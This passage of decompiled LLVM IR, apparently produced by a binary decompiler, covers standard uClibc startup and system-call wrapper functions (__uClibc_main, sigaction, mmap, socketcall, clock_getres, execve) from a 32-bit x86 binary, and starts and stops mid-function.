  %v5_8051b06 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80581e0.225, i32 0, i32 0), i32 %v0_8051b00)
  %v1_8051b0e = load i32, i32* @esi, align 4
  %v12_8051b0e = icmp eq i32 %v5_8051b06, %v1_8051b0e
  br i1 %v12_8051b0e, label %dec_label_pc_8051b17, label %dec_label_pc_8051b12

dec_label_pc_8051b12:                             ; preds = %dec_label_pc_8051afe
  %v0_8051b12 = call i32 @abort()
  br label %dec_label_pc_8051b17

dec_label_pc_8051b17:                             ; preds = %dec_label_pc_8051afe, %entry, %dec_label_pc_8051b12
  %v2_8051b17 = load i32, i32* %stack_var_-12, align 4
  %v2_8051b18 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051b18, i32* @ebx, align 4
  store i32 %v0_8051ae7, i32* @esi, align 4
  ret i32 %v2_8051b17

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_8051b17, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8051b1e = load i8, i8* @global_var_806093c.226, align 4
  %v1_8051b1e = icmp eq i8 %v0_8051b1e, 0
  %v1_8051b25 = icmp eq i1 %v1_8051b1e, false
  br i1 %v1_8051b25, label %entry.dec_label_pc_8051b57_crit_edge, label %dec_label_pc_8051b27

entry.dec_label_pc_8051b57_crit_edge:             ; preds = %entry
  %v0_8051b5a.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051b57

dec_label_pc_8051b27:                             ; preds = %entry
  store i8 1, i8* @global_var_806093c.226, align 4
  store i32 4096, i32* @global_var_8060930.151, align 16
  %v0_8051b52 = call i32 @_stdio_init()
  br label %dec_label_pc_8051b57

dec_label_pc_8051b57:                             ; preds = %entry.dec_label_pc_8051b57_crit_edge, %dec_label_pc_8051b27
  %v0_8051b5a = phi i32 [ %v0_8051b5a.pre, %entry.dec_label_pc_8051b57_crit_edge ], [ %v0_8051b52, %dec_label_pc_8051b27 ]
  ret i32 %v0_8051b5a

; uselistorder directives
  uselistorder i8* @global_var_806093c.226, { 1, 0 }
  uselistorder label %dec_label_pc_8051b57, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8060928.227, align 8
  store i32 %arg6, i32* @global_var_8060938.224, align 8
  %v2_8051b92 = mul i32 %arg2, 4
  %v3_8051b92 = add i32 %tmp29, %v2_8051b92
  %v1_8051b95 = add i32 %v3_8051b92, 4
  store i32 %v1_8051b95, i32* %edx.global-to-local, align 4
  store i32 %v1_8051b95, i32* @global_var_806092c.219, align 4
  %v3_8051b9e = load i32, i32* %arg3, align 4
  %v14_8051b9e = icmp eq i32 %v1_8051b95, %v3_8051b9e
  store i32 0, i32* %stack_var_-168, align 4
  %v1_8051ba4 = icmp eq i1 %v14_8051b9e, false
  %v4_8051ba4 = select i1 %v1_8051ba4, i32 %v1_8051b95, i32 %v3_8051b92
  store i32 %v4_8051ba4, i32* @global_var_806092c.219, align 4
  %v2_8051bac = ptrtoint i32* %stack_var_-136 to i32
  %v3_8051bb1 = bitcast i32* %stack_var_-136 to i8*
  %v4_8051bb1 = call i32 @__GI_memset(i8* %v3_8051bb1, i32 0, i32 120)
  %v0_8051bb6 = load i32, i32* @global_var_806092c.219, align 4
  br label %dec_label_pc_8051bbe

dec_label_pc_8051bbe:                             ; preds = %dec_label_pc_8051bbe, %entry
  %v0_8051bbe = phi i32 [ %v1_8051bc1, %dec_label_pc_8051bbe ], [ %v0_8051bb6, %entry ]
  %v1_8051bbe = inttoptr i32 %v0_8051bbe to i32*
  %v2_8051bbe = load i32, i32* %v1_8051bbe, align 4
  %v3_8051bbe = icmp eq i32 %v2_8051bbe, 0
  %v1_8051bc1 = add i32 %v0_8051bbe, 4
  %v1_8051bc4 = icmp eq i1 %v3_8051bbe, false
  br i1 %v1_8051bc4, label %dec_label_pc_8051bbe, label %dec_label_pc_8051be5.preheader

dec_label_pc_8051be5.preheader:                   ; preds = %dec_label_pc_8051bbe
  store i32 %v1_8051bc1, i32* @ebx, align 4
  %v1_8051be51 = inttoptr i32 %v1_8051bc1 to i32*
  %v2_8051be52 = load i32, i32* %v1_8051be51, align 4
  %v3_8051be53 = icmp eq i32 %v2_8051be52, 0
  %v1_8051be810 = icmp eq i1 %v3_8051be53, false
  br i1 %v1_8051be810, label %dec_label_pc_8051bca.lr.ph, label %dec_label_pc_8051bea

dec_label_pc_8051bca.lr.ph:                       ; preds = %dec_label_pc_8051be5.preheader
  %v3_8051ba2 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8051bd5 = add i32 %v3_8051ba2, 32
  br label %dec_label_pc_8051bca

dec_label_pc_8051bca:                             ; preds = %dec_label_pc_8051bca.lr.ph, %dec_label_pc_8051be2
  %v1_8051bd5 = phi i32 [ %v2_8051be52, %dec_label_pc_8051bca.lr.ph ], [ %v2_8051be5, %dec_label_pc_8051be2 ]
  %v0_8051bd4 = phi i32 [ %v1_8051bc1, %dec_label_pc_8051bca.lr.ph ], [ %v1_8051be2, %dec_label_pc_8051be2 ]
  %v6_8051bcf = icmp ugt i32 %v1_8051bd5, 14
  br i1 %v6_8051bcf, label %dec_label_pc_8051be2, label %dec_label_pc_8051bd1

dec_label_pc_8051bd1:                             ; preds = %dec_label_pc_8051bca
  %v0_8051bd1 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8051bd1, i32* %stack_var_-160, align 4
  store i32 %v0_8051bd4, i32* %stack_var_-168, align 4
  %v2_8051bd5 = mul i32 %v1_8051bd5, 8
  %v4_8051bd5 = add i32 %v3_8051bd5, %v2_8051bd5
  %v3_8051bda = inttoptr i32 %v4_8051bd5 to i16*
  %v4_8051bda = call i32 @memcpy(i16* %v3_8051bda, i32 %v0_8051bd4, i32 8)
  %v0_8051be2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051be2

dec_label_pc_8051be2:                             ; preds = %dec_label_pc_8051bca, %dec_label_pc_8051bd1
  %v0_8051be2 = phi i32 [ %v0_8051bd4, %dec_label_pc_8051bca ], [ %v0_8051be2.pre, %dec_label_pc_8051bd1 ]
  %v1_8051be2 = add i32 %v0_8051be2, 8
  store i32 %v1_8051be2, i32* @ebx, align 4
  %v1_8051be5 = inttoptr i32 %v1_8051be2 to i32*
  %v2_8051be5 = load i32, i32* %v1_8051be5, align 4
  %v3_8051be5 = icmp eq i32 %v2_8051be5, 0
  %v1_8051be8 = icmp eq i1 %v3_8051be5, false
  br i1 %v1_8051be8, label %dec_label_pc_8051bca, label %dec_label_pc_8051bea

dec_label_pc_8051bea:                             ; preds = %dec_label_pc_8051be2, %dec_label_pc_8051be5.preheader
  store i32 %v2_8051bac, i32* @eax, align 4
  %v0_8051bee = call i32 @_dl_aux_init()
  store i32 %v0_8051bee, i32* @eax, align 4
  %v0_8051bf3 = call i32 @__GI___uClibc_init()
  store i32 4096, i32* %edx.global-to-local, align 4
  %v1_8051c01 = icmp eq i32 %tmp24, 0
  %v3_8051c03 = select i1 %v1_8051c01, i32 4096, i32 %tmp24
  %v13_8051c06 = icmp eq i32 %tmp23, -1
  store i32 %v3_8051c03, i32* @global_var_8060930.151, align 16
  %v1_8051c10 = icmp eq i1 %v13_8051c06, false
  br i1 %v1_8051c10, label %dec_label_pc_8051c3b, label %dec_label_pc_8051c12

dec_label_pc_8051c12:                             ; preds = %dec_label_pc_8051bea
  %v0_8051c12 = call i32 @getuid()
  store i32 %v0_8051c12, i32* @ebx, align 4
  %v0_8051c19 = call i32 @geteuid()
  %v0_8051c1e = load i32, i32* @ebx, align 4
  %v12_8051c1e = icmp eq i32 %v0_8051c1e, %v0_8051c19
  %v1_8051c20 = icmp eq i1 %v12_8051c1e, false
  br i1 %v1_8051c20, label %dec_label_pc_8051c51, label %dec_label_pc_8051c22

dec_label_pc_8051c22:                             ; preds = %dec_label_pc_8051c12
  %v0_8051c22 = call i32 @getgid()
  store i32 %v0_8051c22, i32* @ebx, align 4
  %v0_8051c29 = call i32 @getegid()
  %v0_8051c2e = load i32, i32* @ebx, align 4
  %v12_8051c2e = icmp eq i32 %v0_8051c2e, %v0_8051c29
  %v1_8051c30 = icmp eq i1 %v12_8051c2e, false
  br i1 %v1_8051c30, label %dec_label_pc_8051c51, label %dec_label_pc_8051c32.thread

dec_label_pc_8051c32.thread:                      ; preds = %dec_label_pc_8051c22
  br label %dec_label_pc_8051c7b

dec_label_pc_8051c3b:                             ; preds = %dec_label_pc_8051bea
  %v15_8051c3b = icmp eq i32 %tmp23, %tmp22
  %v1_8051c3f = icmp eq i1 %v15_8051c3b, false
  br i1 %v1_8051c3f, label %dec_label_pc_8051c51, label %dec_label_pc_8051c41

dec_label_pc_8051c41:                             ; preds = %dec_label_pc_8051c3b
  br label %dec_label_pc_8051c51

dec_label_pc_8051c51:                             ; preds = %dec_label_pc_8051c41, %dec_label_pc_8051c3b, %dec_label_pc_8051c22, %dec_label_pc_8051c12
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8051c58 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8051c67 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8051c76 = call i32 @__check_one_fd()
  br label %dec_label_pc_8051c7b

dec_label_pc_8051c7b:                             ; preds = %dec_label_pc_8051c32.thread, %dec_label_pc_8051c51
  %v0_8051c7b = load i32, i32* @edi, align 4
  %v1_8051c7b = inttoptr i32 %v0_8051c7b to i32*
  %v2_8051c7b = load i32, i32* %v1_8051c7b, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059668.221 to i32), i32 -134583912), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_8051c7b, i32* inttoptr (i32 134588056 to i32*), align 8
  store i32 %arg5, i32* @global_var_8060934.223, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059668.221 to i32), i32 -134583912), i32 2), i32 0), label %dec_label_pc_8051ca0, label %dec_label_pc_8051cac

dec_label_pc_8051ca0:                             ; preds = %dec_label_pc_8051c7b, %dec_label_pc_8051ca0
  %v4_8051ca052 = phi i32 [ %v1_8051ca7, %dec_label_pc_8051ca0 ], [ 0, %dec_label_pc_8051c7b ]
  store i32 ptrtoint (i32* @global_var_8051ca7.229 to i32), i32* %stack_var_-160, align 4
  %v5_8051ca0 = mul i32 %v4_8051ca052, 4
  %v6_8051ca0 = add i32 %v5_8051ca0, ptrtoint (i32* @global_var_8059668.221 to i32)
  %v7_8051ca0 = inttoptr i32 %v6_8051ca0 to i32*
  %v8_8051ca0 = load i32, i32* %v7_8051ca0, align 4
  call void @__pseudo_call(i32 %v8_8051ca0)
  %v0_8051ca7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ca7 = add i32 %v0_8051ca7, 1
  store i32 %v1_8051ca7, i32* %ebx.global-to-local, align 4
  %v1_8051ca8 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051ca8 = icmp ult i32 %v1_8051ca7, %v1_8051ca8
  br i1 %v7_8051ca8, label %dec_label_pc_8051ca0, label %dec_label_pc_8051cac

dec_label_pc_8051cac:                             ; preds = %dec_label_pc_8051ca0, %dec_label_pc_8051c7b
  store i32 134552754, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059668.221 to i32), i32 -134583912), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059668.221 to i32), i32 -134583912), i32 2), i32 0), label %dec_label_pc_8051cc4, label %dec_label_pc_8051cd0

dec_label_pc_8051cc4:                             ; preds = %dec_label_pc_8051cac, %dec_label_pc_8051cc4
  %v4_8051cc442 = phi i32 [ %v1_8051ccb, %dec_label_pc_8051cc4 ], [ 0, %dec_label_pc_8051cac ]
  store i32 ptrtoint (i32* @global_var_8051ccb.230 to i32), i32* %stack_var_-160, align 4
  %v5_8051cc4 = mul i32 %v4_8051cc442, 4
  %v6_8051cc4 = add i32 %v5_8051cc4, ptrtoint (i32* @global_var_8059668.221 to i32)
  %v7_8051cc4 = inttoptr i32 %v6_8051cc4 to i32*
  %v8_8051cc4 = load i32, i32* %v7_8051cc4, align 4
  call void @__pseudo_call(i32 %v8_8051cc4)
  %v0_8051ccb = load i32, i32* @ebx, align 4
  %v1_8051ccb = add i32 %v0_8051ccb, 1
  store i32 %v1_8051ccb, i32* @ebx, align 4
  %v1_8051ccc.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8051ccc = icmp ult i32 %v1_8051ccb, %v1_8051ccc.pre
  br i1 %v7_8051ccc, label %dec_label_pc_8051cc4, label %dec_label_pc_8051cd0

dec_label_pc_8051cd0:                             ; preds = %dec_label_pc_8051cc4, %dec_label_pc_8051cac
  %v0_8051cd9 = load i32, i32* %stack_var_-160, align 4
  %v1_8051cd9 = call i32 @__errno_location(i32 %v0_8051cd9)
  %v1_8051cde = inttoptr i32 %v1_8051cd9 to i32*
  store i32 0, i32* %v1_8051cde, align 4
  %v0_8051ced = call i32 @__GI___h_errno_location()
  store i32 %v0_8051ced, i32* @eax, align 4
  %v1_8051cf2 = inttoptr i32 %v0_8051ced to i32*
  store i32 0, i32* %v1_8051cf2, align 4
  %v0_8051cf8 = load i32, i32* @eax, align 4
  store i32 %v0_8051cf8, i32* %stack_var_-160, align 4
  %v0_8051cff = load i32, i32* @edi, align 4
  store i32 %v0_8051cff, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8051d0e = load i32, i32* @eax, align 4
  %v1_8051d11 = call i32 @__GI_exit(i32 %v0_8051d0e)
  %v0_8051d1d = load i32, i32* @ebx, align 4
  %v1_8051d1d = inttoptr i32 %v0_8051d1d to %sigcontext*
  %v2_8051d1d = call i32 @sigreturn(%sigcontext* %v1_8051d1d)
  %v0_8051d25 = load i32, i32* @ebx, align 4
  %v1_8051d25 = inttoptr i32 %v0_8051d25 to %sigcontext*
  %v2_8051d25 = call i32 @sigreturn(%sigcontext* %v1_8051d25)
  ret i32 %v2_8051d25

; uselistorder directives
  uselistorder i32 %v1_8051ccb, { 1, 2, 0 }
  uselistorder i32 %v1_8051ca7, { 1, 2, 0 }
  uselistorder i32 %v2_8051be5, { 1, 0 }
  uselistorder i32 %v1_8051be2, { 2, 1, 0 }
  uselistorder i32 %v1_8051bc1, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051bbe, { 1, 0 }
  uselistorder i32 %v1_8051b95, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 3, 4, 2, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059668.221 to i32), i32 -134583912), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059668.221 to i32), i32 -134583912), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_8051cc4, { 1, 0 }
  uselistorder label %dec_label_pc_8051ca0, { 1, 0 }
  uselistorder label %dec_label_pc_8051c7b, { 1, 0 }
  uselistorder label %dec_label_pc_8051be2, { 1, 0 }
  uselistorder label %dec_label_pc_8051bca, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8051d27 = load i32, i32* @esi, align 4
  %v0_8051d28 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051d3d = icmp eq i32* %arg2, null
  br i1 %v1_8051d3d, label %dec_label_pc_8051d91, label %dec_label_pc_8051d41

dec_label_pc_8051d41:                             ; preds = %entry
  %v2_8051d41 = load i32, i32* %arg2, align 4
  store i32 %v2_8051d41, i32* %stack_var_-148, align 4
  %v1_8051d4a = add i32 %tmp11, 4
  %v3_8051d5c = bitcast i32* %stack_var_-136 to i16*
  %v4_8051d5c = call i32 @memcpy(i16* %v3_8051d5c, i32 %v1_8051d4a, i32 128)
  br label %dec_label_pc_8051d91

dec_label_pc_8051d91:                             ; preds = %entry, %dec_label_pc_8051d41
  %v1_8051d93 = icmp eq i32 %arg3, 0
  br i1 %v1_8051d93, label %dec_label_pc_8051d9b, label %dec_label_pc_8051d97

dec_label_pc_8051d97:                             ; preds = %dec_label_pc_8051d91
  %v2_8051d97 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8051d9b

dec_label_pc_8051d9b:                             ; preds = %dec_label_pc_8051d91, %dec_label_pc_8051d97
  %v0_8051daa = phi i32 [ 0, %dec_label_pc_8051d91 ], [ %v2_8051d97, %dec_label_pc_8051d97 ]
  br i1 %v1_8051d3d, label %dec_label_pc_8051da8, label %dec_label_pc_8051da1

dec_label_pc_8051da1:                             ; preds = %dec_label_pc_8051d9b
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8051da8

dec_label_pc_8051da8:                             ; preds = %dec_label_pc_8051d9b, %dec_label_pc_8051da1
  %v0_8051dab = phi %sigaction* [ null, %dec_label_pc_8051d9b ], [ %phitmp, %dec_label_pc_8051da1 ]
  %v5_8051db3 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8051dab, i32 %v0_8051daa, i32 8)
  store i32 %v5_8051db3, i32* %ebx.global-to-local, align 4
  br i1 %v1_8051d93, label %dec_label_pc_8051df6, label %dec_label_pc_8051dc1

dec_label_pc_8051dc1:                             ; preds = %dec_label_pc_8051da8
  %v2_8051dc1 = icmp slt i32 %v5_8051db3, 0
  br i1 %v2_8051dc1, label %dec_label_pc_8051df6, label %dec_label_pc_8051dc5

dec_label_pc_8051dc5:                             ; preds = %dec_label_pc_8051dc1
  %v3_8051dc5 = load i32, i32* %stack_var_-288, align 4
  %v2_8051dc9 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8051dc5, i32* %v2_8051dc9, align 4
  %v2_8051dd1 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8051dd6 = add i32 %arg3, 4
  %v3_8051dda = inttoptr i32 %v1_8051dd6 to i16*
  %v4_8051dda = call i32 @memcpy(i16* %v3_8051dda, i32 %v2_8051dd1, i32 128)
  %v2_8051de3 = add i32 %arg3, 132
  %v3_8051de3 = inttoptr i32 %v2_8051de3 to i32*
  %v2_8051df0 = add i32 %arg3, 136
  %v3_8051df0 = inttoptr i32 %v2_8051df0 to i32*
  %v0_8051dfc.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051df6

dec_label_pc_8051df6:                             ; preds = %dec_label_pc_8051dc1, %dec_label_pc_8051da8, %dec_label_pc_8051dc5
  %v0_8051dfc = phi i32 [ %v5_8051db3, %dec_label_pc_8051dc1 ], [ %v5_8051db3, %dec_label_pc_8051da8 ], [ %v0_8051dfc.pre, %dec_label_pc_8051dc5 ]
  store i32 %v0_8051d28, i32* @ebx, align 4
  store i32 %v0_8051d27, i32* @esi, align 4
  ret i32 %v0_8051dfc

; uselistorder directives
  uselistorder i1 %v1_8051d93, { 1, 0 }
  uselistorder i1 %v1_8051d3d, { 1, 0 }
  uselistorder i32* null, { 0, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8051df6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051da8, { 1, 0 }
  uselistorder label %dec_label_pc_8051d9b, { 1, 0 }
  uselistorder label %dec_label_pc_8051d91, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8051e07 = load i32, i32* @eax, align 4
  %v1_8051e09 = sub i32 0, %v0_8051e07
  %v1_8051e0b = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_8051e10 = inttoptr i32 %v1_8051e0b to i32*
  store i32 %v1_8051e09, i32* %v2_8051e10, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8051e1c = load i32, i32* @ebx, align 4
  %v2_8051e23 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8051e23, i32* @ebx, align 4
  %v8_8051e27 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8051e1c, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_8051e27, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134553092)
  ret i32 %v8_8051e27

; uselistorder directives
  uselistorder i32 %v8_8051e27, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134553092, { 1, 0 }
  uselistorder i32 -4096, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051e38 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e38, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051e4b = call i32 @int80_syscall(i32 102)
  store i32 %v1_8051e4b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051e4b, -4095
  br i1 %tmp, label %dec_label_pc_8051e64, label %dec_label_pc_8051e58

dec_label_pc_8051e58:                             ; preds = %entry
  %v0_8051e58 = load i32, i32* %stack_var_-4, align 4
  %v1_8051e58 = call i32 @__errno_location(i32 %v0_8051e58)
  %v0_8051e5d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051e5d = sub i32 0, %v0_8051e5d
  %v2_8051e5f = inttoptr i32 %v1_8051e58 to i32*
  store i32 %v1_8051e5d, i32* %v2_8051e5f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051e64

dec_label_pc_8051e64:                             ; preds = %entry, %dec_label_pc_8051e58
  %v0_8051e65 = phi i32 [ %v1_8051e4b, %entry ], [ -1, %dec_label_pc_8051e58 ]
  %v2_8051e64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051e64, i32* @edx, align 4
  %v2_8051e68 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051e68, i32* @ebx, align 4
  ret i32 %v0_8051e65

; uselistorder directives
  uselistorder i32 %v1_8051e4b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e64, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051e6d = load i32, i32* @esi, align 4
  store i32 %v0_8051e6d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051e81 = load i32, i32* @ebx, align 4
  %v7_8051e89 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8051e89, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_8051e89, -4095
  br i1 %tmp, label %dec_label_pc_8051ea1, label %dec_label_pc_8051e95

dec_label_pc_8051e95:                             ; preds = %entry
  %v1_8051e95 = call i32 @__errno_location(i32 %v0_8051e81)
  %v0_8051e9a = load i32, i32* %esi.global-to-local, align 4
  %v1_8051e9a = sub i32 0, %v0_8051e9a
  %v2_8051e9c = inttoptr i32 %v1_8051e95 to i32*
  store i32 %v1_8051e9a, i32* %v2_8051e9c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051ea1

dec_label_pc_8051ea1:                             ; preds = %entry, %dec_label_pc_8051e95
  %v0_8051ea2 = phi i32 [ %v7_8051e89, %entry ], [ -1, %dec_label_pc_8051e95 ]
  %v2_8051ea4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051ea4, i32* @esi, align 4
  ret i32 %v0_8051ea2

; uselistorder directives
  uselistorder i32 %v7_8051e89, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051ea1, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ea8 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ea8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8051ebb = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8051ebb, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8051ebb, -4095
  br i1 %tmp, label %dec_label_pc_8051ed4, label %dec_label_pc_8051ec8

dec_label_pc_8051ec8:                             ; preds = %entry
  %v0_8051ec8 = load i32, i32* %stack_var_-4, align 4
  %v1_8051ec8 = call i32 @__errno_location(i32 %v0_8051ec8)
  %v0_8051ecd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ecd = sub i32 0, %v0_8051ecd
  %v2_8051ecf = inttoptr i32 %v1_8051ec8 to i32*
  store i32 %v1_8051ecd, i32* %v2_8051ecf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ed4

dec_label_pc_8051ed4:                             ; preds = %entry, %dec_label_pc_8051ec8
  %v0_8051ed5 = phi i32 [ %v4_8051ebb, %entry ], [ -1, %dec_label_pc_8051ec8 ]
  %v2_8051ed4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051ed4, i32* @edx, align 4
  %v2_8051ed8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051ed8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051ed5

; uselistorder directives
  uselistorder i32 %v4_8051ebb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051ed4, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051edc = load i32, i32* @edi, align 4
  store i32 %v0_8051edc, i32* %stack_var_-4, align 4
  %v4_8051ee0 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051ee0, i32* %edi.global-to-local, align 4
  %v0_8051eec = load i32, i32* @ebx, align 4
  %v5_8051ef4 = insertvalue [1 x i8*] undef, i8* %tmp6, 0
  %v8_8051ef4 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8051ef4 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8051ef4, [1 x i8*] %v8_8051ef4)
  store i32 %v9_8051ef4, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v9_8051ef4, -4095
  br i1 %tmp13, label %dec_label_pc_8051f0c, label %dec_label_pc_8051f00

dec_label_pc_8051f00:                             ; preds = %entry
  %v1_8051f00 = call i32 @__errno_location(i32 %v0_8051eec)
  %v0_8051f05 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051f05 = sub i32 0, %v0_8051f05
